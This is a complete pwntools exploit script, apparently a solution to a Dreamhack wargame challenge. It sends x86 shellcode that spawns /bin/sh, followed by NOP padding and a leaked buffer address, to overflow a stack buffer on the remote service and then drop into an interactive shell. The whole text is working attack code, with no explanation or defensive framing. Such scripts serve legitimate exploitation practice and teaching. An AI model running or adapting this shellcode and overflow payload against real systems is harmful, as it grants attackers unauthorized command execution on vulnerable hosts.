from pwn import *
context.log_level = 'debug'
shellcode  = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
payload = shellcode
payload += '\x90'*(0x84 - len(shellcode))

r=remote('host1.dreamhack.games', 8376)
print r.recvuntil('buf = (')
buf_addr = int(r.recv(10), 16)

payload += p32(buf_addr)
r.send(payload)
r.interactive()

